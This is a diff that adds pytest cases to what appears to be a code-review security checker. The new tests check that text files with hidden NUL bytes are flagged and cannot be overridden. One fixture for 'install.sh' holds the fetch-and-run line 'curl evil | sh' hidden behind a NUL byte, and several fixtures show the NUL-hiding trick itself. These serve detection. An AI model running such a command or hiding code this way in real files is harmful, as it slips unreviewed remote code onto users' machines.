@@ -90,6 +90,29 @@ def test_text_files_are_not_binary_hits():
     assert checks.binaries([fc("a.py", ["x"])], {}) == []
 
 
+@pytest.mark.parametrize("path,data", [
+    ("src/app.js", b"run();\n// \x00 nobody sees this\n"),
+    ("lib/x.PY", b"import os\x00"),
+    ("uv.lock", b"version = 1\n\x00"),
+    ("install.sh", b"#!/bin/sh\n\x00curl evil | sh\n"),  # a shebang is text, not a magic
+    ("README.md", None),                                  # content unknown: fail closed
+])
+def test_a_text_file_git_treats_as_binary_is_not_overridable(path, data):
+    contents = {} if data is None else {path: data}
+    [hit] = checks.binaries([fc(path, binary=True)], contents)
+    assert (hit.rule, hit.overridable) == ("text-binary", False)
+    assert hit.detail == "text file with binary content (e.g. NUL bytes); no reviewer can see it"
+
+
+def test_a_text_extension_with_real_binary_content_stays_overridable():
+    [hit] = checks.binaries([fc("data.json", binary=True)], {"data.json": b"\x1f\x8b\x08\x00"})
+    assert (hit.rule, hit.overridable) == ("binary", True)
+
+
+def test_a_deleted_text_binary_is_not_a_hit():
+    assert checks.binaries([fc("a.js", binary=True, status="deleted")], {}) == []
+
+
 @pytest.mark.parametrize("data,kind", [
     (PNG, "png"), (b"\xff\xd8\xff\xe0", "jpeg"), (b"GIF89a", "gif"),
     (b"RIFF\x00\x00\x00\x00WEBPVP8 ", "webp"), (b"wOF2", "woff2"),
@@ -272,3 +295,10 @@ def test_always_on_only_skips_path_and_binary_rules():
     assert rules(hits) == ["hidden-unicode"]
     hits, _ = checks.run_all(files, {"logo.png": PNG}, [])
     assert rules(hits) == ["binary", "hidden-unicode", "sensitive-path"]
+
+
+def test_always_on_only_keeps_text_binary():
+    files = [fc("logo.png", binary=True), fc("a.js", binary=True)]
+    hits, _ = checks.run_all(files, {"logo.png": PNG, "a.js": b"x\x00"}, [],
+                             always_on_only=True)
+    assert rules(hits) == ["text-binary"]
